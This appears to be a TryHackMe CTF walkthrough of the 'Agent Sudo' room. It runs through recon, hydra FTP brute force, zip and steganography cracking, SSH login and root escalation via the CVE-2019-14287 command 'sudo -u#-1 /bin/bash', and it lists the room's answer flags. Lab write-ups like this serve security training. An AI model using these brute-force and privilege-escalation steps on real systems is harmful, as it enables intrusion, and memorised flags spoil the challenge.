# Agent Sudo

Room [Agent Sudo](https://tryhackme.com/room/agentsudoctf) on TryHackMe

<h2></h2>

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "AgentSudo".

`mkdir AgentSudo`

- Change directory into AgentSudo.

`cd AgentSudo/`

<p align="center"> <img src="https://i.imgur.com/paVUuj7.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Task 1: Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.147.5] Then [10.10.122.93](because ran out of time)

<h2></h2>

<h3>Task 2:Enumerate Questions</h3> 

Enumerate the machine and get all the important information.

Question 1: How many open ports?

Question 2: How you redirect yourself to a secret page?

Question 3: What is the agent name?

<h2></h2>

<h3>Reconnaissance:</h3> 
  
Gather the Information from the Target Machine with Nmap Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 10.10.147.5`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.147.5`.

<p align="center"> <img src="https://i.imgur.com/jR20tUB.png" height="90%" width="90%" alt=""/>

We found 3 ports open. 
- Port: 21/TCP Service: ftp
- Port: 22/TCP Service: ssh
- Port: 80/TCP Service: http

We got the answer for question 1:

Answer: `3`

<h2></h2>

<h3>Examine the HTTP Port</h3>

Since port 80  HTTP is open, we will examine the HTTP webpage.

<p align="center"> <img src="https://i.imgur.com/mzK7Doc.png" height="90%" width="90%" alt=""/>

The webpage's text said we need to use our own codename as "user-agent" to access the site. Meaning we will need to use the "user-agent" to redirect ourselves to a secret page.

We can answer question 2:

Answer: `user-agent`

<h2></h2>

<h3>Using User-Agent to Redirect to the Secret Page</h3>

In order to change our user-agent, we will navigate to the HTTP webpage. (I will be using Google Chrome for this task)

- Press: `Ctrl + Shift + I` to inspect the webpage.

<p align="center"> <img src="https://i.imgur.com/VJB909G.png" height="90%" width="90%" alt=""/>

- Click on the "three dots" > Select "More tools" > Select "Network conditions".

<p align="center"> <img src="https://i.imgur.com/O26TCJS.png" height="90%" width="90%" alt=""/>

- Network conditions menu will appear at the bottom of the inspect, uncheck: "Use browser default" on "User agent" > Enter: "C" as the custom user agent > Refresh the webpage. (Normally, we would start from "A to Z" in order to find the custom user agent, but the hint of the question told us it's "C".

<p align="center"> <img src="https://i.imgur.com/eXsOfn0.png" height="90%" width="90%" alt=""/>

- After refreshing the page, we can close the inspect.

<p align="center"> <img src="https://i.imgur.com/2Vb1o2t.png" height="90%" width="90%" alt=""/>

We found the secret page and agent. And the agent to be "Chris".

<p align="center"> <img src="https://i.imgur.com/vpNScNk.png" height="90%" width="90%" alt=""/>

We can answer the third question:

Answer: `chris`

<h2></h2>

<h3>Task 3: Hash cracking and brute-force Questions</h3>

Question 1: FTP password

Question 2: Zip file password

Question 3: steg password

Question 4: Who is the other agent (in full name)?

Question 5: SSH password

<h2></h2>

<h3>Using Hydra to Crack Chris's Password</h3>

In order to find the FTP password, we will use `hydra` command.

On Terminal: `hydra -l chris -P ../../../Desktop/wordlists/rockyou.txt 10.10.147.5 ftp` 

- Successfully cracked crack's password to be "crystal".

<p align="center"> <img src="https://i.imgur.com/WAlIP4E.png" height="90%" width="90%" alt=""/>

We can answer question 1: 

Answer: `crystal`

<h2></h2>

<h3>Exploiting FTP port with Chris's Login</h3>

Since Port 21 FTP is open, we can use Chris's username and password to login.

On Terminal: `ftp chris@10.10.147.54`

- Successfully logged into chris's account.

<p align="center"> <img src="https://i.imgur.com/QicGW8Y.png" height="90%" width="90%" alt=""/>

We will grab all the files into our own machine by using "mget" command.

On Terminal: `mget *.*`

- We successfully got 3 files, "cute-alien.jpg", "cutie.png", and "To_agentJ.txt".

<p align="center"> <img src="https://i.imgur.com/0KFggti.png" height="90%" width="90%" alt=""/>

Since we got everything from Chris's account on FTP port, we can close the connection with FTP by using "quit" command.

<p align="center"> <img src="https://i.imgur.com/LeygRPk.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Examine the 3 New Files From Chris's Login</h3>

We will first examine the "To_agentJ.txt" file by using the `cat` command.

- It stated that the photo are fake and the login and password is stored in the fake picture.

<p align="center"> <img src="https://i.imgur.com/mGBwrzB.png" height="90%" width="90%" alt=""/>

We can use the `binwalk` command to examine the files and extract any hidden folders/files if there is any.

On Terminal: `binwalk -e cute-alien.jpg`

- `binwalk`: This is the name of the command-line tool being used. Binwalk is a tool for analyzing binary files, which can be useful for finding embedded files and data within them.

- `-e`: This is an option or flag for the "binwalk" command. In this context, the "-e" flag tells binwalk to extract any embedded files or data it finds within "cute-alien.jpg."

- `cute-alien.jpg`: This is the file you want to analyze with binwalk. In this case, it's "cute-alien.jpg," and binwalk will scan this file for any hidden or embedded data.

The file "cute-alien.jpg" shows there is nothing really special

<p align="center"> <img src="https://i.imgur.com/rvhim0d.png" height="90%" width="90%" alt=""/>

We will use the `binwalk` command to examine "cutie.png".

On Terminal: `binwalk -e cutie.png`

We have successfully extracted the hidden folder from "cutie.png".

<p align="center"> <img src="https://i.imgur.com/Tc2cCr1.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Examine the New Directory</h3>

We will change directory into the new folder with the `cd` command.

On Terminal: `cd _cutie.png.extracted`

<p align="center"> <img src="https://i.imgur.com/KzlV3tc.png" height="90%" width="90%" alt=""/>

We will examine the files inside the new directory by using `ls -la` and `file *`.

On Terminal: `ls -la`
On Terminal: `file *`

<p align="center"> <img src="https://i.imgur.com/PYV8B39.png" height="90%" width="90%" alt=""/>

Since both "365" and "365.zlib" is encrypted and "To_agentR.txt" is empty, we will focus on cracking "8702.zip".

<p align="center"> <img src="https://i.imgur.com/5DZnD1F.png" height="90%" width="90%" alt=""/>

The file inside "8702.zip" required a password.

<p align="center"> <img src="https://i.imgur.com/alWs82a.png" height="90%" width="90%" alt=""/>

We will use `zip2john` to get the hash of the password. Then store it as "hash".

On Terminal: `zip2john 8702.zip > hash`

- `zip2john`: This is the name of the command or tool you are using. "zip2john" is a utility that can extract password hashes from password-protected ZIP archives. These password hashes are often used for password cracking.

- `8702.zip`: This is the name of the ZIP archive file you want to extract password hash information from. In this case, the file is named "8702.zip."

` `>`: The greater-than symbol (">") is used to redirect the output of the command to a file. In this context, it's instructing the command to take the output (password hash information) and save it in a file.

- `hash`: This is the name of the file where the password hash information will be saved. You are creating a file named "hash" to store this information.

<p align="center"> <img src="https://i.imgur.com/alWs82a.png" height="90%" width="90%" alt=""/>

We will use `john` command to crack the hash.

On Terminal: `john --show hash`

- `john`: This is the name of the command-line tool, John the Ripper, which is commonly used for password cracking. It is a powerful and flexible tool for testing the security of password hashes.

- `--show`: This is an option or flag used with John the Ripper. When you use "--show," you are telling the tool to display the cracked or recovered passwords associated with a given hash.

- `hash`: This is an argument or parameter passed to the "john" command. In this context, "hash" likely represents the filename or location of the file containing password hashes that you want John the Ripper to crack. The tool will attempt to crack the passwords associated with these hashes.

<p align="center"> <img src="https://i.imgur.com/IFHfTX7.png" height="90%" width="90%" alt=""/>

We have successfully cracked the zip file password to be "alien".

We can answer question 2: 

Answer: `alien`

<h2></h2>

<h3>Unzip the File with Password</h3>

We will unzip the file using `7z` command.

On Terminal: `7z e 8702.zip`

- `7z`: This is the name of the 7-Zip command-line tool, which is used for working with compressed files and archives.

- `e`: This is an option or command for 7-Zip. In this context, "e" stands for "extract." It instructs 7-Zip to extract files from the specified archive.

- `8702.zip`: This is the name of the archive file you want to extract files from. In this case, "8702.zip" is the archive that 7-Zip will process.

<p align="center"> <img src="https://i.imgur.com/izGKr04.png" height="90%" width="90%" alt=""/>

The "To_agentR.txt" file got replaced, and had content in it. We will use `cat` command to read the content.

<p align="center"> <img src="https://i.imgur.com/2AFwmCi.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Crack the File Code</h3>

We have found that the new file "To_agentR.txt" have a value: `QXJlYTUx` inside that we need to crack.

We will go search "hash type identifier" on Google and click on the first link

<p align="center"> <img src="https://i.imgur.com/swMmeoW.png" height="90%" width="90%" alt=""/>

Put in `QXJlYTUx` and Click on "SUBMIT & IDENTIFY".

<p align="center"> <img src="https://i.imgur.com/o9yw1pR.png" height="90%" width="90%" alt=""/>

We found out the the string is "Base64 Encoded". We will crack it.

On Terminal: `echo QXJlYTUx | base64 -d`

<p align="center"> <img src="https://i.imgur.com/oJwigAV.png" height="90%" width="90%" alt=""/>

We can answer the quetion 3:

Answer: `Area51`

<h2></h2>

<h3>Use Stegnanography Technique to Obtain File from cute-alien.jpg</h3>

We will go back a directory for "cute-alien.jpg" with the `cd` command.

On terminal: `cd ..`

<p align="center"> <img src="https://i.imgur.com/ARQ5Hnl.png" height="90%" width="90%" alt=""/>

Since we have the password of `Area51`, we will use the command `steghide` to extract any file from "cute-alien.jpg`.

On Terminal: `steghide extract -sf cute-alien.jpg`

- `steghide`: This is the name of the command-line tool being used. Steghide is a tool for hiding and extracting data within image and audio files using steganography techniques.

- `extract`: This is the command within the steghide tool, indicating that you want to extract hidden data from an image file.

- `-sf`: This is an option or flag for the "steghide extract" command. It specifies the source file from which you want to extract data. In this case, the source file is "cute-alien.jpg."

- `cute-alien.jpg`: This is the source file from which you want to extract hidden data. In this context, it's the image file "cute-alien.jpg" that may contain concealed information.

We have successfully extracted a new file "message.txt".

<p align="center"> <img src="https://i.imgur.com/M4mGMF1.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Examine the New Txt File</h3>

We will use the `cat` command to examine the file.

On Terminal: `cat message.txt`

We have found information of the other agent name as well as the password for that agent.

<p align="center"> <img src="https://i.imgur.com/OPQqnqP.png" height="90%" width="90%" alt=""/>

We can answer question 4 and 5:

Answer: `james`

Answer: `hackerrules!`

<h2></h2>

<h3>Task 4: Capture the user flag Questions</h3>

Question 1: What is the user flag?

Question 2: What is the incident of the photo called?

<h2></h2>

<h3>Exploit James's Account with SSH</h3>

We will use SSH to login into james's account. (Switched IP address because ran out of time for the first one [10.10.122.93])

On Terminal: `ssh james@10.10.122.93`

<p align="center"> <img src="https://i.imgur.com/nkBhNFw.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Explore James's Account</h3>

We will use the `ls` command to see what file james has.

On Terminal: `ls`

<p align="center"> <img src="https://i.imgur.com/9Xs6fNQ.png" height="90%" width="90%" alt=""/>

We will use the `cat` command to see "user_flag.txt".

On Terminal: `cat user_flag.txt`

Successfully capture the "user flag".

<p align="center"> <img src="https://i.imgur.com/qN5K0cH.png" height="90%" width="90%" alt=""/>

We can answer the first question: 

Answer: `b03d975e8c92a7c04146cfa7a5a313c7`

<h2></h2>

<h3>Extract the File into our Machine</h3>

In order to view the image we have to extract the image into our local machine. To do that we have to:

- Open up another Terminal
- Change directory to the project's directory: `cd Desktop/Tryhackme/AgentSudo/`
- In that Terminal write: `scp -r james@10.10.122.93: .`

  - `scp`: This is the name of the command-line tool used for secure file transfers.

  - `-r`: This is an option or flag for the "scp" command. The "-r" flag is used to copy directories and their contents recursively. If you're copying a directory, it's essential to include this flag.

  - `james@10.10.122.93`: This part specifies the source location. "james" is the username of the remote server, and "10.10.122.93" is the IP address or hostname of the remote server. You're specifying that you want to copy files or directories from the home directory of the user "james" on the remote server.

  - `:`: This colon separates the source location (remote) from the destination location (local).

  - `.`: This period (dot) represents the destination location, which, in this case, is the current directory on your local machine. The dot indicates that you want to copy the files or directories from the remote server to your current working directory.
 
<p align="center"> <img src="https://i.imgur.com/qe6XICg.png" height="90%" width="90%" alt=""/>

We have successfully extracted both "Alien_autospy.jpg" and "user_flag.txt".

<p align="center"> <img src="https://i.imgur.com/ncZAlgw.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Examine the Alien_autospy Picture</h3>

Open the image on our folder > Right-click the image, select "Open with" > "Google Chrome".

- The image will be on chrome

<p align="center"> <img src="https://i.imgur.com/WA5cbdH.png" height="90%" width="90%" alt=""/>

Right-click the image on Chrome again > Select "Search image with Google".

<p align="center"> <img src="https://i.imgur.com/QQSCXFw.png" height="90%" width="90%" alt=""/>

The hint told us, to use "Fox News". Search on Google: "Fox News Alien Autopsy".
- Click on the first link.

<p align="center"> <img src="https://i.imgur.com/nSRjX4e.png" height="90%" width="90%" alt=""/>

Got our answer from the article.

<p align="center"> <img src="https://i.imgur.com/u6xRnZ6.png" height="90%" width="90%" alt=""/>

We can answer the second question:

Answer: `Roswell alien autopsy`

<h2></h2>

<h3>Task 5: Privilege Escalation Questions</h3>

Question 1: CVE number for the escalation (Format: CVE-xxxx-xxxx)

Question 2: What is the root flag?

Question 3: (Bonus) Who is Agent R?

<h2></h2>

<h3>Exploit into Root Privilege</h3>

In order to see what sudo command we can do, we will use the `sudo -l` command

On james's account Terminal: `sudo -l`
- Found: User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash

<p align="center"> <img src="https://i.imgur.com/zf1MKKo.png" height="90%" width="90%" alt=""/>

We will search on Google what exploit it is
- On google search: "agent-sudo: (ALL, !root) /bin/bash exploit".
- Click on the first link.

<p align="center"> <img src="https://i.imgur.com/iGTW9cM.png" height="90%" width="90%" alt=""/>

We found the CVE to be "2019-14287".

<p align="center"> <img src="https://i.imgur.com/sq7MbSF.png" height="90%" width="90%" alt=""/>

We can answer the first question:

Answer: `CVE-2019-14287`

<h2></h2>

<h3>Gain Root Privilege</h3>

When we scroll down on the exploit-db webpage, we can see the exploit command: "sudo -u#-1 /bin/bash"

<p align="center"> <img src="https://i.imgur.com/DvWgLtd.png" height="90%" width="90%" alt=""/>

We will now exploit the account to gain root privileges.

On Terminal: `sudo -u#-1 /bin/bash`

Successfully gained root privilege.

<p align="center"> <img src="https://i.imgur.com/2P4LFxE.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Explore Root Privilege</h3>

We will change directory to the root directory by using the `cd` command.

On Terminal: `cd /root`

<p align="center"> <img src="https://i.imgur.com/asIo1Ud.png" height="90%" width="90%" alt=""/>

We will see what file the root directory has by using `ls` command.

We will look at the "root.txt" content by using the `cat` command.

On Terminal: `ls`
On Terminal: `cat root.txt`

<p align="center"> <img src="https://i.imgur.com/SzZwFQ4.png" height="90%" width="90%" alt=""/>

We successfully capture the root flag and found out who is Agent R.

<p align="center"> <img src="https://i.imgur.com/K9yhE2K.png" height="90%" width="90%" alt=""/>

We can answer both of the final question:

Answer: `b53a02f55b57d4439e3341834d70c062`

Answer: `Deskel`



